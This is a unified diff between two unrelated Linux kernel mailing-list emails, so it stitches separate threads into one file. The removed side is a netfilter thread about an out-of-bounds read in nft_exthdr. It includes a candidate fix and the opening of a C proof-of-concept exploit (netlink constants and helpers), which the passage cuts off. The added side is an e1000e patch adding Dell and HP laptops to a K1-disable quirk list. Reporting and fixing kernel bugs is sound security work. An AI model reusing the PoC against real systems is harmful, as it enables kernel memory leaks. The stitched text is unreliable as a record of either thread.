@@ -1,71 +1,118 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=217.70.190.124
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.125.188.122
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795659846;
-	b=P+h0pMxQrAPZYv2uNhOj6RiL6rLnWWlq8hmv+U//luPrvBj6BynVbEDTd5k6KxCV0MJQ
-	 3L4i1eMeYwHWwpwZHHmr7IMjDiCQY1Cicz56WBYWZBbFvAhBBmUrJUmqoUYjLEjl64hri
-	 cCEZUEEZdaJqxjEvt/DdIsJ46Q6kKhKxC+MbeGSZY4Xuu6GxcvA+Kxqfknried6xnYRcX
-	 N3HG5VQSRn6tNFlHgq7No8qWWySkshDVXqbnQx2NNWov1lsMZK6FDUVg0JcbdFEnE6lS5
-	 jwP7Rwx15/xxQ8G99WG7Tu0zSOodPtvZL1jtRgYoz+gsR3XBAo0ZNmfiMOUhF9uGxxg==
+	t=1795660017;
+	b=V7Gh1DkO95hv6avyv6u1zyYEw8TKA9Ptp/R7Ieu4WsAhSjz5oOCQeCsnCD27uWjgbl2Z
+	 K+eTWsA+Zb2kmPzuMqGy51VNyAShYnUg8EHJLAH9NqLV4ftFvuGdJAqYAkBtcjV63ft+1
+	 WWFaha2AsyAxLXipE41Bb3k914Y9TPjdJy7ITB7h41zWBkQm/KtQAHnwHx62PaoHLzOpF
+	 sWEDw4UKN3s7h3Xixx055R9xgnRYOYCen0DcaY9/gaGSbNIwHZX2F/3pkXNx8lgBNHwoY
+	 DouzmzCqwq/0cKkfbCxpPkBRIUu2n0lB+3Q1+vwBk6y2um/2RwOm7aQo59x87LcIkPQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795659846;
-	h=DMARC-Filter:DKIM-Signature:Received:Date:From:To:Cc:Subject:
-	 Message-ID:References:MIME-Version:Content-Type:Content-Disposition:
-	 Content-Transfer-Encoding:In-Reply-To:X-Spam-Status:
-	 X-Spam-Checker-Version;
-	bh=VAP3d6M0GBB9mvkSicxCQEE++z7Ng2hIq9HJyi0wOzM=;
-	b=dcG+IcG78AMu8FAyAvPcn+hHKosZ8+s21urk7Zk3pgcXuYizZyyIzJAJRb3lf2HKaeFM
-	 GWkLbiib0FgGpmYMha/sDHaf12NJodik3tJge3k6xVA2P+2exlibb2ty60aMG70CrteVI
-	 73/uoQXkc5FoAswl3/RdEBQOQdaMA1CsWp9nwgT+uEH9pQT1klson8vp7zf/Jj/p4ZCn9
-	 srm0C497Pi84J9jK/belGSj2vPV925u9sP3OKp4aXTqQpLmpxTMkQeudTgLBDL7ZdnARN
-	 fg38rc4nGVOIgMB8yT0aC0mOMAArtKPLWLc7+3ELIwcgkpCF0lSJSIollImcWZlZyXw==
+	a=rsa-sha256; c=relaxed/relaxed; t=1795660017;
+	h=DMARC-Filter:Received:DKIM-Signature:Received:
+	 X-Google-DKIM-Signature:X-Forwarded-Encrypted:X-Gm-Message-State:
+	 X-Gm-Gg:X-Received:X-Received:Received:Date:From:To:Cc:Subject:
+	 Message-ID:Mail-Followup-To:References:MIME-Version:Content-Type:
+	 Content-Disposition:In-Reply-To;
+	bh=VZ0LpREsSiaCZ1xvrAarlAYj3hq6yIUoz1ZqZEl4im8=;
+	b=fPAaIB9z32ROR6Q8zru7tkAbRHPU3+x8DEtuq9OpjvuE8kUqn0JquvO51t5NTdsrOm9E
+	 beT1cwX1IJxK1hUEvl1zqCiNtQTduBgMGOy2bl1iga2Lsa8PRVx/fZyUZdFTcRq4pB0m0
+	 Sd9MnZoc9ZCynNd6/PCbnth7tkmC7cMUmjnStqTBmcZRxNouI+WLBA3UUbTMSrOkx+zJS
+	 EkXMxBJP0gpkeQEc+tCc5Z2aNdzn+efnlbokA0jyxuaLR8utfXwefJXvi/TJd2HSa7ac9
+	 vnc2FQVbPKbWdk5Awgq6+1roPWC5IP+GxsSnUMxxERP4jfkSFOegs4jnc8ifRmLjQlA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=none header.from=netfilter.org;
-	spf=pass smtp.mailfrom=netfilter.org;
-	dkim=pass header.d=netfilter.org header.i=@netfilter.org header.a=rsa-sha256 header.s=2025 header.b=Vxr6cKgS;
-	arc=none smtp.remote-ip=217.70.190.124
-Received: from mail.netfilter.org (mail.netfilter.org [217.70.190.124])
+	dmarc=pass header.from=canonical.com;
+	spf=pass smtp.mailfrom=canonical.com;
+	dkim=pass header.d=canonical.com header.i=@canonical.com header.a=rsa-sha256 header.s=20251003 header.b=f00LtqH3;
+	arc=none smtp.remote-ip=185.125.188.122
+Received: from smtp-relay-internal-0.canonical.com (smtp-relay-internal-0.canonical.com [185.125.188.122])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with UTF8SMTPS id 617BB606A31E;
-	Thu, 26 Nov 2026 02:24:05 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 617BB606A31E
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=netfilter.org
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 39B5C606A321
+	for <netdev@vger.kernel.org>; Thu, 26 Nov 2026 02:26:55 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 39B5C606A321
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=canonical.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=canonical.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.a=rsa-sha256 header.s=2025 header.b=Vxr6cKgS
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=netfilter.org;
-	s=2025; t=1795659842;
-	bh=VAP3d6M0GBB9mvkSicxCQEE++z7Ng2hIq9HJyi0wOzM=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=Vxr6cKgSbqakay+wdba0Mi6RZ8k2XXJ2UujZsvPJ4ALDQ1I1G9RC+RV+4r5tbFdd0
-	 BcTcScuuVMNars5T0sn/Sug54ap2NqXRKGu0wDXUWOTtyfW/m/0oq40oG6WcbQEzth
-	 r7nWWCs0FZ1/6o6a1qiVrlmJtrsfjvzWJ5Im4XV45LZcU+orh0/wU8N4HpJRNRBPXU
-	 8B1w6DDgTeSIBPPIj9IVLfBwQRHDFuubSMe6o43JWgGdoazG4yHIf5NBl+kDIZRSXn
-	 9q19FUFL92oA2x/E2yTl/1qSdnNfzR+PTRNDpuKLDLFZVbAc/Op5QuTsb+UBklS92H
-	 7BYwx/gkTq0vg==
-Received: from netfilter.org (mail-agni [217.70.190.124])
-	by mail.netfilter.org (Postfix) with UTF8SMTPSA id 61C2A6007B;
-	Thu, 26 Nov 2026 03:24:02 +0100 (CET)
-Date: Thu, 26 Nov 2026 03:23:59 +0100
-From: Pablo Neira Ayuso <pablo@netfilter.org>
-To: Xiang Mei <xmei5@asu.edu>
-Cc: Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@kernel.org>,
-	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
-	Willem de Bruijn <willemb@google.com>,
-	Simon Horman <horms@kernel.org>, netfilter-devel@vger.kernel.org,
-	coreteam@netfilter.org, netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org, stable@vger.kernel.org,
-	co+85229ab197510ca7@bugs.sh
-Subject: Re: [PATCH nf] netfilter: nft_exthdr: pull the IPv6 header before
- ipv6_find_hdr()
-Message-ID: <aweYPz6oQlIYXddC@chamomile>
-References: <20261126001151.13793-1-xmei5@asu.edu>
- <awd9f47inahmDWRP@chamomile>
- <awd_r2mOR7xuYzh4@chamomile>
- <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
+	dkim=pass (4096-bit key) header.d=canonical.com header.i=@canonical.com header.a=rsa-sha256 header.s=20251003 header.b=f00LtqH3
+Received: from mail-pl1-f198.google.com (mail-pl1-f198.google.com [209.85.214.198])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by smtp-relay-internal-0.canonical.com (Postfix) with ESMTPS id 4AFE53FE38
+	for <netdev@vger.kernel.org>; Thu, 26 Nov 2026 02:26:54 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
+	s=20251003; t=1795660014;
+	bh=VZ0LpREsSiaCZ1xvrAarlAYj3hq6yIUoz1ZqZEl4im8=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:In-Reply-To;
+	b=f00LtqH3q59SIz4jEhz/G7Xi2UaqG7ATPnX6nbQmtMBMQLmnwL1P6WmbfJcCxk3FR
+	 H0NB4UsHCC4JI/rWDkLcZEba1tJbhPDY/wDsJt9cX12eb7OiRWCkQBnnL8G+alWmbt
+	 YWnV1/nxW5EM8VBnyyGbGsdiT5QGiz3/do/I+teJp4vdkvK79wNYeAnI3Hh/FVwddz
+	 TxtHcZEZO2Qcc1Cl6nCBNmhgy8vT0RkF76I1pY01naU0vffOM9D018CJerW6NAZGiY
+	 gfQynXCKKeHovl13RlT10BtqCEl6PVZ7CwFHUG6q440tOgxhgoyLlFHezHYHepT0Kd
+	 q6eLt90gs2yJ9u+VrjD5DXp3roQegOVX8cmk8uquw1zr8CTvCkBDHT8iLqWWY5wYTj
+	 HS3emDEqp3fPDAR5WVQXGsoMy4IPoQX0lWrOH5MNeXk2GsliibsHaZKyTcSbEvAQ5S
+	 lFp2RMr2boM3pxiFIY/RRFFGWQUfh/DoDjX8zoDSK0VnKCgp8sjfNk4L/VsF2PqXke
+	 dsnKitFTCzN5cGMWuc+Jmrfns7Jerpq5Q1YIdgbCHiSSHySFpzFvU3r80nM26O9Odu
+	 1FsO1sixDnxgjW9wK71h3ZZhac0lo+3YMKrEim/8K2Y41/KsLlsHnKxpvu/TiWat05
+	 ZWMCH0X5f5giQB76eagC+PMg=
+Received: by mail-pl1-f198.google.com with SMTP id d9443c01a7336-2f05c68629cso42691525ad.1
+        for <netdev@vger.kernel.org>; Wed, 25 Nov 2026 18:26:54 -0800 (PST)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1795660012; x=1796264812;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:mail-followup-to:message-id:subject:cc:to:from:date
+         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to:content-type;
+        bh=VZ0LpREsSiaCZ1xvrAarlAYj3hq6yIUoz1ZqZEl4im8=;
+        b=DXlROvLGV0WIfk7h9ipLCR1T3Hf/Mk5nOh1P7S01/4IfpFY/x2mDq00jHUbXTRpvjM
+         iSfF+TgRHFBVt8NZQnHG4MA6Qo+bxMLkgPNFzO4A0sT1Ah6KvznlubYswkkB3HZ+cvof
+         59nM7cYxvbEKP8s/QtdQqD1LlwT+6SYIVFAxQEKVpTIk/akfmVvkxXgwr1l7L1nL2seX
+         QYiBA8XnB2wsuaSyhWq6uFlcrz3c2Px3weELcQIMaLaC4OES0oWD/zXjlEm4kFgjx14+
+         tFKBDohjTWaa4iq7/Vh05e/SVFQz5PtU2cUlHovDE58rpfVAP/njXN+S/B5XFi6jKT8/
+         PMxA==
+X-Forwarded-Encrypted: i=1; AL+hErFSjw4k1aneSiLRTKvzKfLfrmUT8rO2po+yRQ83eQ+0FVnj5qoxnK0N7o72KPJXBqcBK6XoYCE=@vger.kernel.org
+X-Gm-Message-State: APuU4Z9C73dD2BdNJphrwKU8ZS4/IvmuLKVk9XTQ3+kr1JvOu3kxQJad
+	3eXcu7mFHnMydPLqVXODamFkiUtPE5W3coyj3YbhOd6LpWjF72C6jbR/jSIEkhyWJpLTpm5LXxO
+	oCTeIUxMoVOqgt44fH7vHJ0VYS6nTXPAh/fLD5AaEgrrhl1HFqGyaYFNTllgsXxyXAs5bXK374A
+	==
+X-Gm-Gg: AZFdTZdpcjXq/J/wIm1M/JPGiNu2KSJOUJtRAEpdl5YjXJauf+V5WlsTDweLEyq4TSk
+	wnFSAW4l+xzOOtecDCYQAWuj0tSGULKqmV1jjX5ZAr2hmnWy25jkfi9shXTjnX2glzQXx82sIpc
+	3CLUE6ucGQ37IB+sfErVsNhYwWhMcHf/Us3fOLSX6Jj7y528+dqS1kC6yqodoDcVCS8FnIwO2pj
+	58u/DJAfIum/txf7/5CA44HoGKv08s3wTKx67r3aS4eQxEiWF5DA5xDWHwU1pFBASYRuoSYn2yc
+	zjwOvEZYGU+sJvHQ3GWDSliPPDw/ko3fB/CuWhTVJ9RwUaNbtgKx7Y6Xyj66QIRsvOr4EKU+xmr
+	uVo1BMF775w6fIXhnVeM6byb+Rd+eVIdwl0KxiAP3bNZQ5th7kkStsLQYIVEiAtEEv17k5WO5rx
+	EWayPP+kCu8qV1Ofzzmv9ZaXdJixtM
+X-Received: by 2002:a17:903:298d:b0:2e9:740c:36c with SMTP id d9443c01a7336-2f03f1ba67amr192049515ad.41.1795660012470;
+        Wed, 25 Nov 2026 18:26:52 -0800 (PST)
+X-Received: by 2002:a17:903:298d:b0:2e9:740c:36c with SMTP id d9443c01a7336-2f03f1ba67amr192049315ad.41.1795660012059;
+        Wed, 25 Nov 2026 18:26:52 -0800 (PST)
+Received: from acelan-Precision-5480 (118-163-61-247.hinet-ip.hinet.net. [118.163.61.247])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2f03ee84027sm95486895ad.7.2026.11.25.18.26.48
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 25 Nov 2026 18:26:51 -0800 (PST)
+Date: Thu, 26 Nov 2026 10:26:44 +0800
+From: "Chia-Lin Kao (AceLan)" <acelan.kao@canonical.com>
+To: "Ruinskiy, Dima" <dima.ruinskiy@intel.com>
+Cc: intel-wired-lan@lists.osuosl.org, 
+	Tony Nguyen <anthony.l.nguyen@intel.com>, Przemek Kitszel <przemyslaw.kitszel@intel.com>, 
+	Ye Shu <hello@shuye.dev>, Vitaly Lifshits <vitaly.lifshits@intel.com>, 
+	Andrew Lunn <andrew+netdev@lunn.ch>, "David S. Miller" <davem@davemloft.net>, 
+	Eric Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, 
+	Paolo Abeni <pabeni@redhat.com>, netdev@vger.kernel.org, linux-kernel@vger.kernel.org
+Subject: Re: [PATCH] e1000e: disable K1 by default on more MTL+ systems
+Message-ID: <aweXIb8RzSVHmTwT@acelan-Precision-5480>
+Mail-Followup-To: "Chia-Lin Kao (AceLan)" <acelan.kao@canonical.com>, 
+	"Ruinskiy, Dima" <dima.ruinskiy@intel.com>, intel-wired-lan@lists.osuosl.org, 
+	Tony Nguyen <anthony.l.nguyen@intel.com>, Przemek Kitszel <przemyslaw.kitszel@intel.com>, 
+	Ye Shu <hello@shuye.dev>, Vitaly Lifshits <vitaly.lifshits@intel.com>, 
+	Andrew Lunn <andrew+netdev@lunn.ch>, "David S. Miller" <davem@davemloft.net>, 
+	Eric Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, 
+	Paolo Abeni <pabeni@redhat.com>, netdev@vger.kernel.org, linux-kernel@vger.kernel.org
+References: <20261119001818.513503-1-acelan.kao@canonical.com>
+ <20261124022233.1234651-1-acelan.kao@canonical.com>
+ <087a9cf2-bd0a-4f57-8dcf-9b0962186fe1@intel.com>
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -75,543 +122,181 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
+In-Reply-To: <087a9cf2-bd0a-4f57-8dcf-9b0962186fe1@intel.com>
 
-On Wed, Nov 25, 2026 at 06:43:35PM -0700, Xiang Mei wrote:
-> On Wed, Nov 25, 2026 at 5:39 PM Pablo Neira Ayuso <pablo@netfilter.org> wrote:
+On Wed, Nov 25, 2026 at 09:42:20AM +0200, Ruinskiy, Dima wrote:
+> On 24/11/2026 4:22, Chia-Lin Kao (AceLan) wrote:
+> > Like the Dell Pro 5 Micro P5M1260 added by the previous patch, other
+> > systems with an I219 on MTL or later no longer enter S0ix during
+> > s2idle since commit 578294b8b60d ("e1000e: Reconfigure PLL clock gate timeout and re-enable K1 on Meteor Lake").
+> > Every suspend ends with:
 > >
-> > On Thu, Nov 26, 2026 at 01:29:55AM +0100, Pablo Neira Ayuso wrote:
-> > > On Wed, Nov 25, 2026 at 05:11:51PM -0700, Xiang Mei wrote:
-> > [...]
-> > > > Pull the header before the call, as act_ct, virtio_net_hdr_to_skb() and
-> > > > nft_set_pktinfo_ipv6_ingress() already do.
+> >    intel_pmc_core INT33A1:00: CPU did not enter SLP_S0!!! (S0ix cnt=0)
 > >
-> > I prefer this patch (see attachment).
+> > Each unit ran 3 s2idle cycles on kernel 7.0 with the default K1
+> > setting and, if all of them failed to reach SLP_S0, 3 more with
+> > disable-k1 on. On the following systems the default cycles never
+> > reached SLP_S0 and the disable-k1 cycles all did:
 > >
-> > Please, don't take, I will submit it myself including your
-> > Reported-by: tag.
+> >    Dell Pro 14 PC14250                       [8086:550a, 57a0]
+> >    Dell Pro 3 14 P314260                     [8086:57b3]
+> >    Dell Pro 3 16 P316260                     [8086:57b3]
+> >    Dell Pro 5 14 P514260                     [8086:57b3]
+> >    Dell Pro 5 16 P516260                     [8086:57b3]
+> >    Dell Pro Max 14 MC14250                   [8086:57a0]
+> >    Dell Pro Max 16 MC16250                   [8086:550a]
+> >    Dell Pro Precision 5 14 PW514261          [8086:57b3]
+> >    Dell Pro Precision 5 14S PW514260         [8086:57b3]
+> >    Dell Pro Precision 5 16S PW516260         [8086:57b3]
+> >    Dell Pro Rugged 10 Tablet RA00260         [8086:550e]
+> >    HP ZBook 8 G1i (14/16 inch)               [8086:57a0, 57a1]
+> >    HP EliteBook 6 G1i (13.3/14 inch)         [8086:57a0]
+> >    HP EliteDesk 8 Mini G2i                   [8086:57b3]
 > >
-> > Thanks.
-> 
-> Sorry, I replied only to Pablo earlier. A resend of my test:
-> 
-> Thanks for the patch. I have just tested it agaist the PoC (attached to
-> this mail) but it still leaks.
-> 
-> The 18-byte 802.1Q frame still makes ipv6_find_hdr() read past the
-> tail, same as the unpatched kernel. The pull in validate fails, we
-> fall back to nft_set_pktinfo_unspec(), and nft_do_chain_netdev() still
-> runs the chain, so exthdr gets called with only the skb->protocol
-> check.
+> > Add these systems, matched by DMI vendor and product name, to
+> > disable_k1_list so K1 is disabled by default. The HP entries match
+> > the product family, which covers the screen size variants.
+> >
+> > Cc: stable@vger.kernel.org
+> > Fixes: 578294b8b60d ("e1000e: Reconfigure PLL clock gate timeout and re-enable K1 on Meteor Lake")
+> > Signed-off-by: Chia-Lin Kao (AceLan) <acelan.kao@canonical.com>
+> > ---
+> >   drivers/net/ethernet/intel/e1000e/netdev.c | 98 ++++++++++++++++++++++
+> >   1 file changed, 98 insertions(+)
+> >
+> > diff --git a/drivers/net/ethernet/intel/e1000e/netdev.c b/drivers/net/ethernet/intel/e1000e/netdev.c
+> > index a8f0d3c0fd750..319c7a44f5a53 100644
+> > --- a/drivers/net/ethernet/intel/e1000e/netdev.c
+> > +++ b/drivers/net/ethernet/intel/e1000e/netdev.c
+> > @@ -80,6 +80,104 @@ static const struct dmi_system_id disable_k1_list[] = {
+> >   			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 5 Micro P5M1260"),
+> >   		},
+> >   	},
+> > +	{
+> > +		.ident = "Dell Pro 14 PC14250",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 14 PC14250"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro 3 14 P314260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 3 14 P314260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro 3 16 P316260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 3 16 P316260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro 5 14 P514260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 5 14 P514260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro 5 16 P516260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro 5 16 P516260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Max 14 MC14250",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Max 14 MC14250"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Max 16 MC16250",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Max 16 MC16250"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Precision 5 14 PW514261",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Precision 5 14 PW514261"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Precision 5 14S PW514260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Precision 5 14S PW514260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Precision 5 16S PW516260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Precision 5 16S PW516260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "Dell Pro Rugged 10 Tablet RA00260",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "Dell Inc."),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "Dell Pro Rugged 10 Tablet RA00260"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "HP ZBook 8 G1i",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "HP"),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "HP ZBook 8 G1i"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "HP EliteBook 6 G1i",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "HP"),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "HP EliteBook 6 G1i"),
+> > +		},
+> > +	},
+> > +	{
+> > +		.ident = "HP EliteDesk 8 Mini G2i",
+> > +		.matches = {
+> > +			DMI_MATCH(DMI_SYS_VENDOR, "HP"),
+> > +			DMI_MATCH(DMI_PRODUCT_NAME, "HP EliteDesk 8 Mini G2i"),
+> > +		},
+> > +	},
+> >   	{}
+> >   };
+> Hi AceLan,
+> Thank you for this investigation.
+>
+> With a list of systems this long, covering multiple generations, this
+> suggests a fundamental problem somewhere, probably not what this quirk is
+> intended to solve.
+>
+> Furthemore, as I said, I am not aware of the mechanism by which enabling K1
+> can prevent SLP_S0, and the GBE_D3_STS as a blocker seems particularly
+> strange.
+>
+> I have asked our internal validation team to investigate this, at priority.
+> First I want to understand if this is limited to Dell/HP systems, and if so
+> - why.
+We have Dell and HP machines in the lab, so only systems from these
+two brands have been verified.
 
-I think nft_pktinfo provides enough information to skip this skbuff in
-nft_exthdr, there is pkt->ethertype which can be used for this
-purpose, which should be zero in this case.
-
-diff --git a/net/netfilter/nft_exthdr.c b/net/netfilter/nft_exthdr.c
-index 861bab93f435..448b9ecde1f0 100644
---- a/net/netfilter/nft_exthdr.c
-+++ b/net/netfilter/nft_exthdr.c
-@@ -52,7 +52,7 @@ static void nft_exthdr_ipv6_eval(const struct nft_expr *expr,
-        unsigned int offset = 0;
-        int err;
- 
--       if (pkt->skb->protocol != htons(ETH_P_IPV6))
-+       if (pkt->ethertype != htons(ETH_P_IPV6))
-                goto err;
- 
-        err = ipv6_find_hdr(pkt->skb, &offset, priv->type, NULL, NULL);
-@@ -146,7 +146,7 @@ static void nft_exthdr_ipv4_eval(const struct nft_expr *expr,
-        unsigned int offset;
-        int err;
- 
--       if (skb->protocol != htons(ETH_P_IP))
-+       if (pkt->ethertype != htons(ETH_P_IP))
-                goto err;
- 
-        err = ipv4_find_option(nft_net(pkt), skb, &offset, priv->type);
-
-> I think exthdr still needs its own check, or the netdev/bridge chains
-> should not evaluate rules against an skb that failed validation. Your
-> change still looks useful on top of that for the frags case.
-
-I don't think so, if there is a chance to skip re-evaluation, the better.
-
-> One more thing: nft_meta.c calls __nft_set_pktinfo_ipv6_validate()
-> with a non-zero nhoff for VLAN/PPPoE, but the new code pulls and reads
-> the header at offset 0, so it checks the outer header there.
-> 
-> Thanks,
-> Xiang
-> 
-> The PoC:
-> ```c
-> #include <errno.h>
-> #include <fcntl.h>
-> #include <sched.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <grp.h>
-> #include <sys/prctl.h>
-> #include <net/if.h>
-> #include <arpa/inet.h>
-> #include <sys/ioctl.h>
-> #include <sys/socket.h>
-> #include <sys/time.h>
-> #include <linux/netlink.h>
-> #include <linux/rtnetlink.h>
-> #include <linux/if_packet.h>
-> #include <linux/if_ether.h>
-> 
-> #define NFNL_SUBSYS_NFTABLES    10
-> #define NFNL_MSG_BATCH_BEGIN    16
-> #define NFNL_MSG_BATCH_END      17
-> #define NFT_MSG_NEWTABLE        0
-> #define NFT_MSG_NEWCHAIN        3
-> #define NFT_MSG_NEWRULE         6
-> #define NFT_MSG_GETRULE         7
-> #define NFTA_TABLE_NAME         1
-> #define NFTA_CHAIN_TABLE        1
-> #define NFTA_CHAIN_NAME         3
-> #define NFTA_CHAIN_HOOK         4
-> #define NFTA_CHAIN_TYPE         7
-> #define NFTA_HOOK_HOOKNUM       1
-> #define NFTA_HOOK_PRIORITY      2
-> #define NFTA_HOOK_DEV           3
-> #define NFTA_RULE_TABLE         1
-> #define NFTA_RULE_CHAIN         2
-> #define NFTA_RULE_EXPRESSIONS   4
-> #define NFTA_RULE_USERDATA      7
-> #define NFTA_LIST_ELEM          1
-> #define NFTA_EXPR_NAME          1
-> #define NFTA_EXPR_DATA          2
-> #define NFTA_EXTHDR_DREG        1
-> #define NFTA_EXTHDR_TYPE        2
-> #define NFTA_EXTHDR_OFFSET      3
-> #define NFTA_EXTHDR_LEN         4
-> #define NFTA_EXTHDR_FLAGS       5
-> #define NFT_EXTHDR_F_PRESENT    1
-> #define NFTA_CMP_SREG           1
-> #define NFTA_CMP_OP             2
-> #define NFTA_CMP_DATA           3
-> #define NFTA_DATA_VALUE         1
-> #define NFTA_COUNTER_PACKETS    2
-> #define NFPROTO_NETDEV          5
-> #define NFT_REG_1               1
-> #ifndef NETLINK_NETFILTER
-> #define NETLINK_NETFILTER       12
-> #endif
-> 
-> #define ROUNDS          64
-> 
-> struct nfgen { uint8_t family, version; uint16_t res_id; };
-> 
-> static int nl, pfd, ifi;
-> static uint32_t seq = 1;
-> static uint64_t cnt[256];
-> 
-> static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m,
-> strerror(errno)); exit(1); }
-> 
-> static char *put(char *p, int type, const void *d, int len)
-> {
->         struct nlattr *a = (struct nlattr *)p;
-> 
->         a->nla_type = type;
->         a->nla_len = NLA_HDRLEN + len;
->         memcpy(p + NLA_HDRLEN, d, len);
->         memset(p + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);
->         return p + NLA_ALIGN(a->nla_len);
-> }
-> static char *put_str(char *p, int t, const char *s) { return put(p, t,
-> s, strlen(s) + 1); }
-> static char *put_be32(char *p, int t, uint32_t v) { v = htonl(v);
-> return put(p, t, &v, 4); }
